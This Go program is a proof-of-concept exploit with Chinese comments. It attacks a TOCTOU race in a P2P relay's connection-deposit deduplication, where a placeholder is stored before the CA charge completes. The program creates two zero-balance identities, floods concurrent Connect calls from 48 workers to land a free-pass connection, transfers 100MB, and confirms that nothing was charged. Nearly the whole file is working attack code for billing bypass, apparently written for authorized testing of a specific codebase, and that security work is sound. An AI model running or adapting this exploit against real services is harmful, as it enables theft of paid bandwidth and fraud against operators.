// Command billingpoc-race 对【连接保证金去重】做授权穿透验证：证明 0 余额、0 次 /credit
// 即可完成 100MB 传输，攻破计费系统（判据 2）。
//
// 漏洞（TOCTOU 竞态，admission_register.go onBusinessConnect）：
//
//	relay 按 (client,server) 对在 depositWindow 内去重连接保证金——但它在【CA 扣费完成之前】
//	就把占位时间戳 Store 进 reservedPairs，而 free-pass 分支只要 Load 到未过期占位就 return nil
//	放行、【不核实扣费是否真的成功】。于是：
//	  leader leg  : Store(pairKey, now) → 阻塞在 CA /reserve 往返上（loopback+账本 fsync=数十 ms）
//	  follower leg: 同一对端在该窗口内到达 → Load 到占位 → return nil 放行 → StreamOn 承载真流量
//	  leader      : /reserve 返回 Allow=false（0 余额）→ Delete 占位 + 关自己的 leg —— 但 follower
//	                早已桥接、正在推流。
//	净效果：一条连接建立在一个【从未成功扣费】的占位上。0 余额、0 credit、0 成本。
//
// 触发并发的手段（本 codebase 免费提供竞态）：NATNode.Connect 仅在成功【之后】才缓存 conns[target]，
// 故在首个 Connect 返回前并发发起 N 个 Connect(B)，每个都独立经入口 relay 拨号 → 各自产生
// 携带同 (client,server) 对、不同 connID 的 onBusinessConnect 调用。只要有一个 follower 落进某个
// leader 的 /reserve 窗口内，它就免费放行。CA RTT 越大越稳。
//
// 约束合规：全程只用公开 /issue 免费领两张【0 余额】证书；从不调用 /credit；不新部署服务。
package main

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"sync"
	"sync/atomic"
	"time"

	"bnfs_p2p/admissioncli"
	"bnfs_p2p/crypoto"
	"bnfs_p2p/logx"
	"bnfs_p2p/p2pnode"
	"bnfs_p2p/p2pnode/impl/natnode"
)

func main() {
	caURL := flag.String("ca", os.Getenv("BNFS_BILLING_CA_URL"), "CA 地址（也可用 BNFS_BILLING_CA_URL）")
	relay := flag.String("relay", os.Getenv("BNFS_BILLING_RELAY_ADDR"), "index/relay 地址（也可用 BNFS_BILLING_RELAY_ADDR）")
	sizeMB := flag.Int("size", 100, "传输大小(MB)")
	workers := flag.Int("workers", 48, "持续并发 hammer Connect 的 worker 数（制造稠密到达 + 加剧 CA ledger 锁争用，拉宽占位窗口）")
	maxAttempts := flag.Int("attempts", 4000, "所有 worker 合计最多发起多少次 Connect 后放弃")
	flag.Parse()
	if *caURL == "" || *relay == "" {
		fmt.Fprintln(os.Stderr, "必须通过参数或 BNFS_BILLING_* 环境变量提供 CA 和 relay 地址")
		os.Exit(2)
	}

	logx.SetLevel(logx.LevelInfo)
	target := int64(*sizeMB) * 1024 * 1024
	const chunk = 256 * 1024

	fmt.Printf("=== 连接保证金去重 TOCTOU 竞态穿透验证 (判据2: 0 余额传 %dMB) ===\n", *sizeMB)
	fmt.Printf("测试端点已配置，workers=%d attempts<=%d\n\n", *workers, *maxAttempts)

	// —— 两个全新的 0 余额身份（只 /issue 领证，绝不 /credit）——
	skey, err := crypoto.MakeKeyPair()
	must("生成 B(server) 密钥", err)
	ckey, err := crypoto.MakeKeyPair()
	must("生成 A(client) 密钥", err)

	nodeB, err := natnode.NewNATNode(skey, *relay)
	must("创建 B(server)", err)
	must("B 申请 server 证书(0 余额)", admissioncli.SetupNat(nodeB, *caURL, admissioncli.RoleServer()))
	fmt.Println("[B] server 身份已就绪（余额应始终为 0）")

	nodeA, err := natnode.NewNATNode(ckey, *relay)
	must("创建 A(client)", err)
	must("A 申请 client 证书(0 余额)", admissioncli.SetupNat(nodeA, *caURL, admissioncli.RoleClient()))
	fmt.Println("[A] client 身份已就绪（余额应始终为 0）")

	cBefore := balanceOf(*caURL, string(nodeA.ID()))
	sBefore := balanceOf(*caURL, string(nodeB.ID()))
	fmt.Printf("[余额] 攻击前  client=%dB  server=%dB (均应为 0)\n", cBefore, sBefore)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// B 收满 target 字节并做增量 SHA256。
	done := make(chan string, 1)
	nodeB.OnConnection(func(conn p2pnode.Connection) {
		go func() {
			h := sha256.New()
			var got int64
			for got < target {
				msg, rerr := conn.Receive(ctx)
				if rerr != nil {
					fmt.Printf("[B] 接收中断 @%dB: %v\n", got, rerr)
					return
				}
				got += int64(len(msg.Payload))
				h.Write(msg.Payload)
				if got%(10*1024*1024) < chunk {
					fmt.Printf("[B] 已接收 %d MB (0 余额, 免费连接上, 未熔断)\n", got/1024/1024)
				}
			}
			select {
			case done <- hex.EncodeToString(h.Sum(nil)):
			default:
			}
		}()
	})

	go func() {
		if e := nodeB.Listen(ctx, *relay); e != nil {
			fmt.Printf("[B] Listen 退出: %v\n", e)
		}
	}()
	go func() {
		if e := nodeA.Listen(ctx, *relay); e != nil {
			fmt.Printf("[A] Listen 退出: %v\n", e)
		}
	}()
	time.Sleep(3 * time.Second)

	// —— 竞态攻击：worker 池持续 hammer 同 (A,B) 对的 Connect，制造稠密并发到达 +
	// 加剧 CA ledger 全局锁/落盘争用，拉宽 (Store→Delete) 占位窗口，使某个后到者在窗口内
	// Load 到占位、命中 free-pass 分支免费建连。 ——
	fmt.Printf("\n[A] worker 池 hammer Connect（%d workers, 合计上限 %d 次）...\n", *workers, *maxAttempts)
	conn := raceConnect(ctx, nodeA, nodeB.ID(), *workers, *maxAttempts)
	if conn == nil {
		fmt.Printf("\n❌ %d 次 Connect 内未抢到免费连接（加大 -workers / -attempts）。\n", *maxAttempts)
		os.Exit(1)
	}
	fmt.Printf("[A] 抢到免费连接（0 余额未被扣费即建连成功），推送 %dMB (A→B = client_to_relay 不计量)\n\n", *sizeMB)

	payload := make([]byte, target)
	rand.New(rand.NewSource(42)).Read(payload)
	srcSHA := sha256.Sum256(payload)

	start := time.Now()
	for off := int64(0); off < target; off += chunk {
		end := off + chunk
		if end > target {
			end = target
		}
		if e := conn.Send(ctx, &p2pnode.Message{Payload: payload[off:end]}); e != nil {
			must("A 发送", e)
		}
	}
	fmt.Printf("[A] 发送完成, 耗时 %s\n", time.Since(start).Truncate(time.Millisecond))

	select {
	case dstSHA := <-done:
		cAfter := balanceOf(*caURL, string(nodeA.ID()))
		sAfter := balanceOf(*caURL, string(nodeB.ID()))
		fmt.Printf("\n=== 结果 ===\n")
		fmt.Printf("源 SHA256: %s\n收 SHA256: %s\n", hex.EncodeToString(srcSHA[:]), dstSHA)
		if dstSHA != hex.EncodeToString(srcSHA[:]) {
			fmt.Printf("SHA 校验: ❌ 不一致\n")
			os.Exit(1)
		}
		fmt.Printf("SHA 校验: ✅ 一致\n\n")
		fmt.Printf("[余额] 攻击后  client=%dB  server=%dB\n", cAfter, sAfter)
		spent := (cBefore - cAfter) + (sBefore - sAfter)
		fmt.Printf("[扣费] 合计 %dB (=%.4fMB)\n", spent, float64(spent)/1024/1024)
		if spent <= 0 {
			fmt.Printf("\n✅ 判据2 达成（0 成本）: TOCTOU 竞态下 %dMB 传输 0 扣费、0 credit、未熔断。\n", *sizeMB)
		} else {
			fmt.Printf("\n⚠️ 有扣费 %dB：本轮 leader 之一成功扣了费；重跑或调 burst 争取纯 follower 命中。\n", spent)
		}
	case <-time.After(20 * time.Minute):
		fmt.Printf("超时\n")
		os.Exit(1)
	}
}

// raceConnect 用 workers 个 worker 持续【稠密并发】hammer Connect(target)，制造 TOCTOU：
// 所有 Connect 共享同一 (client,server) pairKey。只要某个 worker 在先行者仍阻塞于
// CA /reserve 往返(持占位 reservedPairs)期间 Load 到未过期占位，就命中 free-pass 分支被免费放行。
//
// 为何稠密并发比"错峰"稳：relay(index) 对 CA 的 /reserve 走 loopback，占位窗口只有数 ms，
// 手工错峰无法对准。但旧版最小 CA 的 ledger.reserve 全程持一把【全局互斥锁】且每次都 persistLocked
// (写临时文件 + rename fsync)，高并发下这些 /reserve 在 CA 侧串行化 → 先行者持占位的时间被
// 显著拉宽，而稠密到达又保证此刻正有大量 worker 在 Load。两者叠加把命中率从"手调时序"变成"堆并发"。
// 任一 Connect 返回成功（follower 免费建连）即用其连接，并发出停止信号。
func raceConnect(ctx context.Context, node *natnode.NATNode, target p2pnode.NodeID, workers, maxAttempts int) p2pnode.Connection {
	var once sync.Once
	var winner p2pnode.Connection
	stop := make(chan struct{})
	var attempts int64
	var wg sync.WaitGroup

	report := func(c p2pnode.Connection, workerID int, n int64) {
		once.Do(func() {
			winner = c
			fmt.Printf("[A] worker#%d 第 %d 次 Connect 免费建连成功（follower 命中去重占位, 0 扣费）\n", workerID, n)
			close(stop)
		})
	}

	for w := 0; w < workers; w++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case <-stop:
					return
				default:
				}
				n := atomic.AddInt64(&attempts, 1)
				if n > int64(maxAttempts) {
					return
				}
				cctx, ccancel := context.WithTimeout(ctx, 12*time.Second)
				c, err := node.Connect(cctx, target)
				ccancel()
				if err == nil && c != nil {
					report(c, workerID, n)
					return
				}
			}
		}(w)
	}

	done := make(chan struct{})
	go func() { wg.Wait(); close(done) }()
	<-done
	return winner
}

func must(what string, err error) {
	if err != nil {
		fmt.Printf("[FATAL] %s: %v\n", what, err)
		os.Exit(1)
	}
}

// balanceOf 查询 CA 账本余额（仅读，不涉及 /credit 分发余额）。
func balanceOf(caURL, nodeID string) int64 {
	resp, err := http.Get(caURL + "/balance?node=" + nodeID)
	if err != nil {
		return -1
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	var m map[string]int64
	if json.Unmarshal(body, &m) != nil {
		return -1
	}
	return m["balance"]
}
